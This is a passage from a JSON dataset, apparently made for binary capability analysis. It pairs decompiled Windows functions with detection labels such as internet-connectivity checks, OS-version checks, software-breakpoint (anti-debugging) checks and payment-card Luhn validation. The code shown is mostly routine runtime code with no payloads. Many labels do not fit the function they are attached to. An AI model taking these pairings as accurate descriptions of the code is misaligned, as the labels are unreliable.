    }\n    }\n    else {\n        uVar1 = param_2 & 0x7fffffff;\n        if (uVar1 < 0x40900000) {\n            return CONCAT44(param_2, param_1) + *0x47ccb0;\n        }\n        if (uVar1 < 0x7ff00000) {\n            if (param_2 < 0x80000000) {\n                in_XMM0_Qa = *0x47cce0 * *0x47cce0;\n                arg_14h = 0xe;\n            }\n            else {\n                in_XMM0_Qa = *0x47cce8 * *0x47cce8;\n                arg_14h = 0xf;\n            }\n        }\n        else {\n            if ((uVar1 < 0x7ff00001) && (param_1 == 0)) {\n                if (param_2 != 0x7ff00000) {\n                    return *0x47ccd8;\n                }\n                return *0x47ccd0;\n            }\n            arg_14h = 0x3ea;\n        }\n    }\n    uStack12 = SUB82(in_XMM0_Qa, 0);\n    Stack10 = in_XMM0_Qa >> 0x10;\n    fcn.0046d6b3(&param_1, &param_1, &uStack12, arg_14h);\n    in_XMM0_Qa = CONCAT62(Stack10, uStack12);\ncode_r0x0046b492:\n    return in_XMM0_Qa;\n}\n",
        "token_count": 1035
    },
    "0046e442": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046e442(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == 0) {\n        puVar1 = fcn.0045652e();\n        *puVar1 = 0x16;\n        fcn.004559dd();\n        return 0xffffffff;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapSize)(*0x496134, 0, arg_8h);\n    return uVar2;\n}\n",
        "token_count": 123
    },
    "0046f49e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.0046f49e(double param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_14h;\n    double dVar6;\n    double dVar7;\n    uchar in_XMM0 [16];\n    double dVar8;\n    double dVar9;\n    double dVar10;\n    double dVar11;\n    double dStack12;\n    \n    iVar4 = 0;\n    while( true ) {\n        uVar2 = SUB162(in_XMM0 >> 0x30, 0) >> 4;\n        dVar6 = SUB168(in_XMM0, 0) & *0x481890 | *0x481900;\n        dVar7 = SUB168(in_XMM0, 0) & *0x481898 | *0x481908;\n        uVar1 = SUB82(*0x4818b0 + dVar6, 0) & 0x7f0;\n        dVar11 = *0x4818c8 & dVar7;\n        dVar9 = (*0x4818c0 & dVar6) * *(uVar1 + 0x481da0) - *0x4818a0;\n        dVar6 = (dVar6 - (*0x4818c0 & dVar6)) * *(uVar1 + 0x481da0);\n        dVar8 = (dVar7 - dVar11) * *(uVar1 + 0x481da8);\n        dVar7 = dVar6 + dVar9;\n        dVar11 = dVar8 + (dVar11 * *(uVar1 + 0x481da8) - *0x4818a8);\n        uVar3 = uVar2 - 1;\n        if (uVar3 < 0x7fe) {\n            iVar4 = (uVar2 - 0x3ff) + iVar4;\n            dVar10 = iVar4;\n            iVar5 = 0;\n            if (uVar1 + iVar4 * 0x400 == 0) {\n                iVar5 = 0x10;\n            }\n            return ((*0x481958 * dVar11 + *0x481968) * dVar11 + *0x481978) * dVar11 * dVar11 +\n                   ((*0x481950 * dVar7 + *0x481960) * dVar7 + *0x481970) * dVar7 * dVar7 * dVar7 * dVar7 * dVar7 +\n                   *0x481980 * dVar7 + *(uVar1 + 0x481998) + dVar10 * *0x4818d8 + (dVar8 & *(iVar5 + 0x4818e8)) +\n                   *(uVar1 + 0x481990) + dVar9 + dVar10 * *0x4818d0 + (dVar6 & *(iVar5 + 0x4818e0));\n        }\n        dStack12 = -(*0x481910 == param_1);\n        if (SUB82(dStack12, 0) != 0) break;\n        if (uVar3 != 0xffffffff) {\n            if (uVar3 < 0x7ff) {\n                if (*0x481900 == (param_1 & *0x481890 | *0x481900)) {\n                    return *0x481938;\n                }\n                arg_14h = 0x3e9;\n                dStack12 = *0x481890;\n            }\n            else if (((uVar2 & 0x7ff) < 0x7ff) || ((SUB84(param_1, 0) | param_1 >> 0x20 & 0xfffff) == 0)) {\n                dStack12 = -NAN;\n                arg_14h = 9;\n            }\n            else {\n                arg_14h = 0x3e9;\n            }\n            goto code_r0x0046f6aa;\n        }\n        in_XMM0 = CONCAT88(dVar11, param_1 * *0x481920);\n        iVar4 = -0x34;\n    }\n    arg_14h = 8;\n    dStack12 = *0x481930;\ncode_r0x0046f6aa:\n    fcn.0046d6b3(&param_1, &param_1, &dStack12, arg_14h);\n    return dStack12;\n}\n",
        "token_count": 1007
    },
    "0046ff1b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint16_t * fcn.0046ff1b(uint16_t *param_1, uint16_t param_2)\n\n{\n    int32_t iVar1;\n    uchar auVar2 [16];\n    uchar auVar3 [16];\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int32_t iStack68;\n    \n    if (0 < *0x49576c) {\n        auVar2 = pshuflw(ZEXT216(param_2), ZEXT216(param_2), 0);\n        do {\n            if ((param_1 & 0xfff) < 0xff1) {\n                uVar4 = SUB162(auVar2, 0);\n                uVar5 = SUB162(auVar2 >> 0x10, 0);\n                auVar3 = CONCAT214(-(param_1[7] == 0), \n                                   CONCAT212(-(param_1[6] == 0), \n                                             CONCAT210(-(param_1[5] == 0), \n                                                       CONCAT28(-(param_1[4] == 0), \n                                                                CONCAT26(-(param_1[3] == 0), \n                                                                         CONCAT24(-(param_1[2] == 0), \n                                                                                  CONCAT22(-(param_1[1] == 0), \n                                                                                           -(*param_1 == 0)))))))) |\n                         CONCAT214(-(param_1[7] == uVar5), \n                                   CONCAT212(-(param_1[6] == uVar4), \n                                             CONCAT210(-(param_1[5] == uVar5), \n                                                       CONCAT28(-(param_1[4] == uVar4), \n                                                                CONCAT26(-(param_1[3] == uVar5), \n                                                                         CONCAT24(-(param_1[2] == uVar4), \n                                                                                  CONCAT22(-(param_1[1] == uVar5), \n                                                                                           -(*param_1 == uVar4))))))));\n                uVar4 = SUB161(auVar3 >> 7, 0) & 1 | (SUB161(auVar3 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar3 >> 0x17, 0) & 1) << 2 | (SUB161(auVar3 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar3 >> 0x27, 0) & 1) << 4 | (SUB161(auVar3 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar3 >> 0x37, 0) & 1) << 6 | (SUB161(auVar3 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar3 >> 0x47, 0) & 1) << 8 | (SUB161(auVar3 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar3 >> 0x57, 0) & 1) << 10 | (SUB161(auVar3 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar3 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar3 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar3 >> 0x77, 0) & 1) << 0xe | SUB161(auVar3 >> 0x7f, 0) << 0xf;\n                if (uVar4 != 0) goto code_r0x0046ffc8;\n                iStack68 = 0x10;\n            }\n            else {\n                if (*param_1 == param_2) {\n                    return param_1;\n                }\n                if (*param_1 == 0) {\n                    return NULL;\n                }\n                iStack68 = 2;\n            }\n            param_1 = param_1 + iStack68;\n        } while( true );\n    }\n    uVar4 = *param_1;\n    while ((uVar4 != 0 && (uVar4 != param_2))) {\n        param_1 = param_1 + 1;\n        uVar4 = *param_1;\n    }\ncode_r0x0046ff6a:\n    return (uVar4 != param_2) - 1 & param_1;\ncode_r0x0046ffc8:\n    iVar1 = 0;\n    if (uVar4 != 0) {\n        for (; (uVar4 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n        }\n    }\n    param_1 = param_1 + iVar1;\n    uVar4 = *param_1;\n    goto code_r0x0046ff6a;\n}\n",
        "token_count": 1095
    },
    "00413c50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413c50(int32_t *param_1)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        fcn.00413c90(1);\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0040da80": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040da80(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.00404c30();\n    var_4h = uVar1 == 2;\n    return uVar1 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 81
    },
    "0041ccb0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0041ccb0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404c30();\n    uVar1 = fcn.00402930();\n    iVar2 = fcn.0042700d(uVar1);\n    if (iVar2 == 0) {\n        fcn.00426d18(4);\n    }\n    fcn.00404c30();\n    uVar1 = fcn.00402930();\n    arg_8h_00 = fcn.00402930();\n    iVar2 = fcn.0041cc80(arg_8h_00, uVar1, arg_ch);\n    return iVar2 == 2;\n}\n",
        "token_count": 193
    },
    "0045aa3e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.0045aa3e(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.004563e9();\n    if (cVar1 == '\\0') {\n        return 0xffffffff;\n    }\n    if (*(param_1 + 0x10) == 0) {\ncode_r0x0045aa63:\n        puVar2 = fcn.0045652e();\n        *puVar2 = 0x16;\n        fcn.004559dd();\n    }\n    else {\n        do {\n            *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n            if (*(param_1 + 0x450) == 2) {\n                return *(param_1 + 0x18);\n            }\n            *(param_1 + 0x38) = 0;\n            *(param_1 + 0x1c) = 0;\ncode_r0x0045ab0b:\n            cVar1 = **(param_1 + 0x10);\n            *(param_1 + 0x31) = cVar1;\n            if (cVar1 != '\\0') {\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                if (*(param_1 + 0x18) < 0) goto code_r0x0045ab1e;\n                arg_ch = *(param_1 + 0x1c);\n                arg_8h = *(param_1 + 0x31);\n                uVar3 = fcn.0045a92a(arg_8h, arg_ch);\n                *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x45ab46\n                switch(uVar3) {\n                case 0:\n                    cVar1 = fcn.0045aba3();\n                    break;\n                case 1:\n                    *(param_1 + 0x28) = 0xffffffff;\n                    *(param_1 + 0x24) = 0;\n                    *(param_1 + 0x30) = 0;\n                    *(param_1 + 0x20) = 0;\n                    *(param_1 + 0x2c) = 0;\n                    *(param_1 + 0x3c) = 0;\n                    goto code_r0x0045ab0b;\n                case 2:\n                    cVar1 = fcn.0045ab66();\n                    break;\n                case 3:\n                    cVar1 = fcn.0045afee();\n                    break;\n                case 4:\n                    goto code_r0x0045aae5;\n                case 5:\n                    cVar1 = fcn.0045ac45();\n                    break;\n                case 6:\n                    cVar1 = fcn.0045ac6b();\n                    break;\n                case 7:\n                    cVar1 = fcn.0045adc5(arg_8h, arg_ch, arg_8h, unaff_ESI, unaff_retaddr, param_2, param_3, param_4, \n                                         param_5, param_6, param_7);\n                    break;\n                case 0xbad1abe1:\n                    goto code_r0x0045ab43;\n                default:\n                    goto code_r0x0045aa63;\n                }\n                if (cVar1 == '\\0') {\n                    return 0xffffffff;\n                }\n                goto code_r0x0045ab0b;\n            }\n            *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0045ab1e:\n            cVar1 = fcn.0045b52e();\n        } while (cVar1 != '\\0');\n    }\ncode_r0x0045ab43:\n    return 0xffffffff;\ncode_r0x0045aae5:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0045ab0b;\n}\n",
        "token_count": 971
    },
    "0040db10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040db10(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.00404c30();\n    var_4h = uVar1 == 3;\n    return uVar1 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 81
    },
    "004132f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004132f0(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470f10;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.004132f0::var_ch;\n    var_1dh._0_1_ = '\\0';\n    iVar3 = in_ECX + 0xc;\n    var_10h = uVar2;\n    fcn.00416660(iVar3);\n    var_4h = 0;\n    arg_8h_00 = 0x413340;\n    cVar1 = fcn.00413050(iVar3, uVar2);\n    if (cVar1 == '\\0') {\n        arg_8h_00 = arg_8h;\n        fcn.00413130(arg_8h);\n        fcn.004126a0(2);\n        fcn.00412d90();\n    }\n    else {\n        var_1dh._0_1_ = '\\x01';\n    }\n    var_4h = 0xffffffff;\n    fcn.00416620();\n    if (var_1dh != '\\0') {\n        iVar3 = fcn.00417390(arg_8h + 8, 1, 0);\n    // switch table (4 cases) at 0x41344c\n        switch(iVar3) {\n        case 0:\n        case 3:\n            break;\n        case 1:\n        case 2:\n            break;\n        default:\n            iVar4 = sub.KERNEL32.dll_GetCurrentThreadId();\n            if ((iVar3 != iVar4) && (iVar3 = fcn.004173d0(arg_8h + 8, 2),  iVar3 != 3)) {\n                fcn.00401b10(8);\n                fcn.00416710(arg_8h + 0x34);\n                var_4h = 1;\n                puVar5 = fcn.00413480(&fcn.004132f0::arg_8h);\n                fcn.004173f0(&fcn.004132f0::var_1dh + 1, *puVar5);\n                var_4h = 0xffffffff;\n                fcn.004166c0();\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 709
    },
    "0043b3bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043b3bf(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    piVar1 = *arg_8h;\n    if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&\n       ((iVar2 = piVar1[5],  iVar2 == 0x19930520 ||\n        (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {\n        fcn.004567ea();\n        pcVar3 = swi(3);\n        uVar4 = (*pcVar3)();\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 195
    },
    "0043c83c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c83c(int32_t arg_8h)\n\n{\n    int32_t *phNewTimer;\n    int32_t iVar1;\n    uint TimerQueue;\n    uint *arg_8h_00;\n    int32_t *in_ECX;\n    code *pcVar2;\n    uint Period;\n    uint Flags;\n    uint var_18h;\n    uint var_ch;\n    \n    in_ECX[1] = 0;\n    phNewTimer = in_ECX + 3;\n    in_ECX[2] = 1;\n    *phNewTimer = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    if (((*0x4910b4 & 0x80000000) == 0) || (iVar1 = fcn.0043d4ec(*0x495804),  iVar1 == 0)) {\n        iVar1 = fcn.00442b71();\n    }\n    *in_ECX = iVar1;\n    if (arg_8h != -1) {\n        iVar1 = fcn.0043f944();\n        if (iVar1 < 3) {\n            Flags = 0x20;\n            Period = 0;\n            pcVar2 = fcn.0043cab6;\n            TimerQueue = fcn.0043ba0a();\n            iVar1 = fcn.0043d122(phNewTimer, TimerQueue, pcVar2, in_ECX, arg_8h, Period, Flags);\n            if (iVar1 == 0) {\n                fcn.004255d9();\n                arg_8h_00 = &var_18h;\n                goto code_r0x0043c8f7;\n            }\n        }\n        else {\n            iVar1 = fcn.0043d73e(arg_8h, fcn.0043ca6f, in_ECX, 0);\n            *phNewTimer = iVar1;\n            if (iVar1 == 0) {\n                fcn.004255d9();\n                arg_8h_00 = &var_ch;\ncode_r0x0043c8f7:\n                fcn.00451487(arg_8h_00, 0x48c8fc);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 523
    },
    "00401d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401d10(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    int32_t var_4h;\n    \n    puVar1 = fcn.00401740(&var_30h);\n    puVar3 = var_4h + 8;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00403670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403670(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint var_34h;\n    uint var_1ch;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4702f0;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = 0xc;\n    var_10h = uVar2;\n    fcn.00401b10(0xc);\n    fcn.00404a90(arg_8h_00, uVar2);\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        fcn.00405100();\n        var_38h = 0;\n        while( true ) {\n            uVar2 = fcn.00404d90();\n            if (uVar2 <= var_38h) break;\n            pcVar3 = fcn.00405270(var_38h);\n            if (*pcVar3 == arg_10h) {\n                uVar4 = fcn.00401440(&var_34h);\n                fcn.004037a0(uVar4);\n            }\n            else {\n                pcVar3 = fcn.00405270(var_38h);\n                fcn.00404e00(*pcVar3);\n            }\n            var_38h = var_38h + 1;\n        }\n        cVar1 = fcn.00404d10();\n        if (cVar1 == '\\0') {\n            arg_8h_00 = fcn.00401440(&var_34h);\n            fcn.004037a0(arg_8h_00);\n        }\n        fcn.00404f30();\n    }\n    uVar4 = fcn.00401440(&var_1ch);\n    fcn.00404a10(uVar4);\n    fcn.004049d0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 567
    },
    "00411200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00411200(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint in_ECX;\n    int32_t arg_10h_00;\n    uint32_t arg_8h_01;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar2 = fcn.00404960();\n    fcn.00406270(arg_8h);\n    uVar3 = fcn.004073f0(arg_8h, arg_ch);\n    if (uVar3 == arg_14h) {\n        iVar2 = fcn.00406170();\n        fcn.00407750(iVar2 + arg_8h * 2, arg_10h, arg_14h);\n    }\n    else {\n        iVar1 = *(iVar2 + 0x10);\n        arg_10h_00 = ((iVar1 - uVar3) - arg_8h) + 1;\n        if (arg_14h < uVar3) {\n            *(iVar2 + 0x10) = iVar1 - (uVar3 - arg_14h);\n            iVar2 = fcn.00406170();\n            iVar2 = iVar2 + arg_8h * 2;\n            fcn.00407750(iVar2, arg_10h, arg_14h);\n            fcn.00407750(iVar2 + arg_14h * 2, iVar2 + uVar3 * 2, arg_10h_00);\n        }\n        else {\n            arg_8h_01 = arg_14h - uVar3;\n            if (*(iVar2 + 0x14) - iVar1 < arg_8h_01) {\n                in_ECX = fcn.00411530(arg_8h_01, 0, arg_8h, uVar3, arg_10h, arg_14h);\n            }\n            else {\n                *(iVar2 + 0x10) = iVar1 + arg_8h_01;\n                iVar2 = fcn.00406170();\n                arg_8h_00 = iVar2 + arg_8h * 2;\n                uVar3 = arg_8h_00 + uVar3 * 2;\n                if ((arg_8h_00 < arg_10h + arg_14h * 2) && (arg_10h <= iVar2 + iVar1 * 2)) {\n                    if (arg_10h < uVar3) {\n                        var_ch = uVar3 - arg_10h >> 1;\n                    }\n                    else {\n                        var_ch = 0;\n                    }\n                }\n                else {\n                    var_ch = arg_14h;\n                }\n                fcn.00407750(uVar3 + arg_8h_01 * 2, uVar3, arg_10h_00);\n                fcn.00407750(arg_8h_00, arg_10h, var_ch);\n                fcn.00407240(arg_8h_00 + var_ch * 2, arg_10h + arg_8h_01 * 2 + var_ch * 2, arg_14h - var_ch);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 836
    },
    "004146d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004146d0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint8_t var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4711d0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = &var_3ch;\n    var_1ch = fcn.00414a60(arg_8h_00);\n    var_4h = 0;\n    var_18h = var_1ch;\n    var_24h = fcn.00417460(&var_2ch, arg_8h, var_1ch);\n    var_4h._0_1_ = 1;\n    var_20h = var_24h;\n    var_dh = (**(*var_14h + 4))(1, 1, 0, var_24h, arg_8h_00, uVar1);\n    var_4h = var_4h._1_3_ << 8;\n    fcn.0040e930();\n    var_4h = 0xffffffff;\n    uVar1 = fcn.00413b60();\n    *in_FS_OFFSET = var_ch;\n    return uVar1 & 0xffffff00 | var_dh;\n}\n",
        "token_count": 422
    },
    "00414cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414cc0(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_3ch;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4712d8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004264cf(1, uVar2);\n    cVar1 = fcn.00413ea0();\n    if (cVar1 == '\\0') {\n        fcn.00414ac0(arg_8h, *(arg_8h + 0x14));\n    }\n    else {\n        if (*(arg_8h + 0x14) != -1) {\n            *(arg_8h + 0x14) = 0x10;\n        }\n        puVar3 = fcn.00413480(&arg_8h);\n        fcn.00417610(*puVar3);\n        var_4h = 0;\n        fcn.00413ce0(&var_3ch, *(arg_8h + 0x14));\n        var_4h = 0xffffffff;\n        fcn.0040de60();\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 354
    },
    "00419540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** __cdecl\nfcn.00419540(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    code **arg_10h;\n    uchar auStack104 [36];\n    uint uStack68;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uchar *puStack32;\n    uint var_18h;\n    uint var_14h;\n    code **var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x471856;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00419540::var_ch_2;\n    fcn.00401440(noname_0);\n    fcn.00419950();\n    var_4h_2 = 0;\n    *var_10h_2 = vtable.std::_Task_async_state_void__0_.0;\n    fcn.00415130();\n    var_4h_2._0_1_ = 1;\n    puStack32 = &stack0xffffff98;\n    var_20h = fcn.00414180();\n    var_4h_2._0_1_ = 2;\n    arg_10h = var_10h_2;\n    puVar1 = fcn.00402eb0(var_10h_2);\n    var_4h_2._0_1_ = 1;\n    var_18h = fcn.004199e0(&fcn.00419540::var_2ch, *puVar1, arg_10h);\n    var_4h_2._0_1_ = 3;\n    uStack68 = 0x4195f1;\n    var_14h = var_18h;\n    fcn.00415180(var_18h);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 1);\n    uStack68 = 0x4195fd;\n    fcn.00415210();\n    *(var_10h_2 + 0x76) = 1;\n    *in_FS_OFFSET = var_ch_2;\n    return var_10h_2;\n}\n",
        "token_count": 712
    },
    "00419670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
